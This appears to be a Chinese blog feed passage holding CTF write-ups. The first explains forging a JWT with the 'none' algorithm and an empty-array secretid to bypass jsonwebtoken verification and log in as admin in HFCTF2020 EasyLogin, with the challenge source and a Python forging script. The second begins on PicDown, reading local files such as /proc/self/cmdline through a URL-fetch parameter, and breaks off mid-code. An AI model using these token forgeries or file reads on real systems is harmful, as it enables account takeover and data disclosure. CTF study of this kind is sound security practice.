</a></p><p><strong>将加密方式改为’none’</strong></p><p>下文实战中的 Juice Shop JWT issue 1 便是这个问题。之前谈及过nonsecure JWT的问题。</p><p>签名算法确保恶意用户在传输过程中不会修改JWT。但是标题中的alg字段可以更改为none。一些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。</p></blockquote><p>此时我们知道，可以更改加密方法，不生成签名，绕过签名验证</p><p>但过不去，我们还需要看一个东西</p><h4><span id="反推">反推</span></h4><p>解题我们还需要看 <strong>/controllers/api.js</strong> 这么个玩意……这也扫不出来啊……</p><p>作为一个啥也不懂的菜鸡，如果从一个开发者的角度去思考……</p><blockquote><p>以下是个人理解……</p></blockquote><h5><span id="koa-框架">koa 框架</span></h5><blockquote><p>/**</p><ul><li><p>或许该用 koa-static 来处理静态文件</p></li><li><p>路径该怎么配置？不管了先填个根目录XD</p><p>  */</p></li></ul></blockquote><p>在引入的js中，可以看到 <strong>koa-static</strong>，查看下koa的框架结构：</p><ol><li>不包含 <strong>controller</strong></li></ol><p><a href="https://segmentfault.com/q/1010000021297024">koa是否有必要实现controllers？ 如何实现？</a></p><ol start="2"><li>包含 <strong>controller</strong></li></ol><p><a href="https://blog.csdn.net/weixin_36554693/article/details/105683996">Koa入门（一）—— Koa项目基础框架搭建</a></p><p><a href="https://blog.csdn.net/weixin_33894640/article/details/91459845">一步一步教你完成Koa2接口开发</a></p><p><a href="https://blog.csdn.net/qq_43702430/article/details/103456209">koa后端模板</a></p><ol start="3"><li>包含 <strong>controller</strong> 的 <strong>MVC</strong> 架构</li></ol><p><a href="https://www.jianshu.com/p/47259f48c153">从零开始搭建koa后台基础框架</a>    <em>（这个其实不是很合适  :D</em></p><h5><span id="controller"><strong>controller</strong>？</span></h5><p>由此可见 koa 框架并没有规定controller的存在，而controller在<strong>不同语境</strong>下有着不同的作用</p><h6><span id="mvc-的-c-controller"><strong>MVC 的 C – controller</strong></span></h6><blockquote><p><em><a href="https://www.cnblogs.com/ghxb/p/8427462.html">MVC 于三层架构最大的区别</a></em></p><p><em><a href="https://blog.csdn.net/csh624366188/article/details/7183872">mvc与三层结构终极区别</a></em></p><p>趁机复习下开发时学到架构知识😋</p></blockquote><img src="/images/HFCTF2020-EasyLogin/image-20210818231056478.png" alt="image-20210818231056478" style="zoom:67%;"><p>上图明显的标出，javaweb中servlet的作用正是 <strong>controller</strong></p><p><img src="/images/HFCTF2020-EasyLogin/image-20210818232015422.png" alt="image-20210818232015422"></p><p><strong>servlet</strong> 作为 <strong>jsp</strong> 与 <strong>Model</strong> 数据交换的平台，上接 <strong>jsp</strong>，下接 **service **，按理来说是这样</p><img src="/images/HFCTF2020-EasyLogin/image-20210818232341328.png" alt="image-20210818232341328" style="zoom:89%;"><blockquote><p>这图不是很合适……</p></blockquote><p>访问不同的servlet，会使用不同的**业务逻辑(service)**，业务逻辑则根据原子化的数据访问层指向符合需求的数据操作</p><p>如果再次细化，以便面向需求灵活的调整，或者<strong>前后端分离</strong>、合作，又出现了 <strong>routes(路由)**，路由可以负责分发不同的请求，处理</strong>前端**。</p><p>而基于路由的分发，<strong>接口(api)**，作为请求</strong>后端**数据的地址与方式也出现了。</p><p>但怎么写呢？上面的例子中也有人把controller写到route中去……</p><blockquote><p>虽然题目说都放根目录……</p></blockquote><h6><span id="rest-api"><strong>REST api</strong></span></h6><blockquote><p>*<a href="https://www.jianshu.com/p/75389ea9a90b">rest api介绍</a>*：rest api 是前后端分离最佳实践，是开发的一套标准或者说是一套规范，不是框架。</p><p><strong>什么是REST呢?</strong></p><p>REST是Representational State Transfer（表现层状态转移）的缩写，它是由罗伊·菲尔丁（Roy Fielding）提出的，是用来描述创建HTTP API的标准方法的，他发现这四种常用的行为（查看（view），创建（create），编辑（edit）和删除（delete））都可以直接映射到HTTP 中已实现的GET,POST,PUT和DELETE方法。</p><p>—— <em><a href="https://blog.csdn.net/qq_42611547/article/details/84346809">什么是REST API</a></em></p><p><a href="https://www.zhihu.com/question/28557115">怎样用通俗的语言解释REST，以及RESTful？</a></p></blockquote><p><strong>实际上，接口开发的rest api规范十分接近答案</strong></p><blockquote><p><strong>开发REST API</strong></p><p>rest-hello 工程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">rest-koa&#x2F;</span><br><span class="line">|</span><br><span class="line">+- .vscode&#x2F;</span><br><span class="line">|  |</span><br><span class="line">|  +- launch.json &lt;-- VSCode 配置文件</span><br><span class="line">|</span><br><span class="line">+- controllers&#x2F;</span><br><span class="line">|  |</span><br><span class="line">|  +- api.js &lt;-- REST API</span><br><span class="line">|  |</span><br><span class="line">|  +- index.js &lt;-- MVC Controllers</span><br><span class="line">|</span><br><span class="line">+- products.js &lt;-- 集中处理Product</span><br><span class="line">|</span><br><span class="line">+- rest.js &lt;-- 支持REST的middleware</span><br><span class="line">|</span><br><span class="line">+- app.js &lt;-- 使用koa的js</span><br><span class="line">|</span><br><span class="line">+- controller.js &lt;-- 扫描注册Controller</span><br><span class="line">|</span><br><span class="line">+- static-files.js &lt;-- 支持静态文件的middleware</span><br><span class="line">|</span><br><span class="line">+- templating.js &lt;-- 支持Nunjucks的middleware</span><br><span class="line">|</span><br><span class="line">+- package.json &lt;-- 项目描述文件</span><br><span class="line">|</span><br><span class="line">+- views&#x2F; &lt;-- Nunjucks模板</span><br><span class="line">|</span><br><span class="line">+- static&#x2F; &lt;-- 静态资源文件</span><br><span class="line">|</span><br><span class="line">+- node_modules&#x2F; &lt;-- npm安装的所有依赖包</span><br></pre></td></tr></table></figure><p><em>——<a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1105009634703392">开发REST API</a></em></p><img src="/images/HFCTF2020-EasyLogin/image-20210818234733270.png" alt="image-20210818234733270" style="zoom:67%;"><p><em>——<a href="https://blog.csdn.net/weixin_33894640/article/details/91459845">一步一步教你完成Koa2接口开发I</a></em></p></blockquote><p>随着工程的增加及工程人员的增多、需求的增多，我们需要合理的规范来保证代码的管理效率与花费。这些结构上的细化便随之加深。</p><blockquote><p>看着感觉十分河里啊……这都是经验啊~</p></blockquote><h5><span id="经验">经验</span></h5><p>有了以上知识作为铺垫，再看引入的 app.js ，我们会发现，这似乎是通过api通信的……</p><p>顺理成章地，如果我们能读取api的逻辑，应该就可以成功伪造jwt了！ </p><blockquote><p>难点也就在于此了吧……</p><p>即使用koa-static托管静态资源，接口也有可能被爬到吧……只有混淆或加密？</p><p>不太懂欸……</p></blockquote><h4><span id="伪造">伪造</span></h4><p>/controllers/api.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!username || username === <span class="string">&#x27;admin&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params"><span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!username || !password</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">ctx.session.username !== <span class="string">&#x27;admin&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>要求用户名为admin，可以查到flag</p><p>登录验证：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>sid不能为null，不能不定义，且取值范围规定在0到<code>global.secrets</code>长度范围内</p><p><strong>注意，此web应用的sid非加密所使用的sid，这里的sid似乎是一种标识……</strong></p><h5><span id="易受攻击的-jwt-库">易受攻击的 JWT 库</span></h5><p>详见：<a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Recommendations-for-Library-Developers">Critical vulnerabilities in JSON Web Token libraries</a></p><blockquote><p>*<em>TL;DR:**If you are using <a href="https://github.com/auth0/node-jsonwebtoken"><strong>node-jsonwebtoken</strong></a>, <a href="https://github.com/jpadilla/pyjwt/">pyjwt</a>, <a href="https://github.com/namshi/jose">namshi/jose</a>, <a href="https://github.com/firebase/php-jwt">php-jwt</a> or <a href="https://github.com/kjur/jsjws">jsjwt</a> with asymmetric keys (RS256, RS384, RS512, ES256, ES384, ES512) please update to the latest version. See<a href="http://jwt.io/">jwt.io</a>for more information on the vulnerable libraries.</em>(Updated 2015-04-20)*</p></blockquote><blockquote><p><strong>Meet the “None” Algorithm</strong></p><p>The<code>none</code>algorithm is a curious addition to JWT. It is intended to be used for situations where the integrity of the token has already been verified. Interestingly enough, it is one of only two algorithms that are mandatory to implement (the other being<code>HS256</code>).</p><p>Unfortunately, some libraries treated tokens signed with the<code>none</code>algorithm as a valid token with a verified signature. The result? Anyone can create their own “signed” tokens with whatever payload they want, allowing arbitrary account access on some systems.</p><p>Putting together such a token is easy. Modify the above example header to contain<code>&quot;alg&quot;: &quot;none&quot;</code>instead of<code>HS256</code>. Make any desired changes to the payload. Use an empty signature (i.e.<code>signature = &quot;&quot;</code>).</p><p>Most (hopefully all?) implementations now have a basic check to prevent this attack: if a secret key was provided, then token verification will fail for tokens using the<code>none</code>algorithm. This is a good idea, but it doesn’t solve the underlying problem: attackers control the choice of algorithm. Let’s keep digging.</p></blockquote><p>这里易受攻击指的是一些非对称加密算法的验证，……大概。</p><p>目前 JWT 应该是支持none的……</p><blockquote><p>The <code>none</code> algorithm is a <strong>curious</strong> addition to JWT.</p></blockquote><blockquote><p>Most (hopefully all?) implementations now <strong>have a basic check to prevent this attack</strong></p></blockquote><p>所以需要我们自行设计来预防空设的攻击</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这其实就是一个验证，最后的最后也就是，<strong>绕过</strong></p><blockquote><p>这部分还是隐藏起来比较好？……</p></blockquote><h5><span id="绕过与其原理">绕过与其原理</span></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure><p>最后我们将在这里对JWT进行验证，这也决定了我们的绕过方式</p><p>register中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line"><span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure><p>secret 按顺序push进secrets中，<strong>sid</strong>正是从中取出secret值的索引</p><p><strong>如果我们：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.&#x27;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br></pre></td></tr></table></figure><p>认证将会提示：</p><p><img src="/images/HFCTF2020-EasyLogin/image-20210819154725607.png" alt="image-20210819154725607"></p><p>正如之前尝试的报错：</p><p><img src="/images/HFCTF2020-EasyLogin/image-20210819154744913.png" alt="image-20210819154744913"></p><p><strong>如果这样</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.&#x27;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br></pre></td></tr></table></figure><p>我们会得到：</p><p><img src="/images/HFCTF2020-EasyLogin/image-20210819155157713.png" alt="image-20210819155157713"></p><p><strong>正确的解析，即使指定了HS256</strong></p><p><strong>undefined</strong>，也可以成功，这就是上面过滤的 <strong>原因</strong></p><p>我们只要控制sid，从secrets数组中取出一个不存在的值即可，使用<strong>小数</strong>或者给sid设置成一个<strong>空数组</strong>之类的……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">                    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hhh&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iat&quot;</span>: <span class="number">1629294555</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                   algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure><p>生成token登入admin</p><img src="/images/HFCTF2020-EasyLogin/image-20210819155836881.png" alt="image-20210819155836881" style="zoom:80%;"><p>获取 flag~</p><img src="/images/HFCTF2020-EasyLogin/image-20210819160525000.png" alt="image-20210819160525000" style="zoom:80%;"><p>没想到写了这么多，感觉还是比较圆满的……</p><p>参考文章:<br><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">jwt详解</a></p><p><a href="https://www.cnblogs.com/xuzhengzong/articles/11777850.html">JWT 前后端分离应用，jwt的token服务端不保存、仅保存加密的secret，所有用户都是这一个secret</a></p><p><a href="https://www.freebuf.com/articles/web/180874.html">深入了解Json Web Token之概念篇</a></p><p><a href="https://www.freebuf.com/articles/web/181261.html">深入了解Json Web Token之实战篇 </a></p><p><a href="https://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/">Security of JSON Web Tokens  (JWT) - Cyber Polygon </a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;jwt 伪造，一下写好长……em，圆满&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯-2020-白虎组-PicDown</title>
    <link href="http://example.com/2021/08/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
    <id>http://example.com/2021/08/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</id>
    <published>2021-08-17T09:40:55.284Z</published>
    <updated>2021-08-23T08:05:36.032Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>网鼎杯-2020-白虎组-PicDown</p><a id="more"></a></blockquote><p>/page 下有一个url参数，输入一个百度，发现下载了网页源码</p><p>试一下本地资源，结果还真读出来了……flag也是根目录……看一眼wp</p><h4><span id="当前运行的程序">当前运行的程序</span></h4><p><strong>/proc/[pid]/cmdline</strong>：输出当前程序的完整命令行信息</p><p>我们可以读取当前web程序的运行：**/proc/self/cmdline**</p><p><code>python app.py</code></p><h4><span id="apppy">app.py</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/page&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == 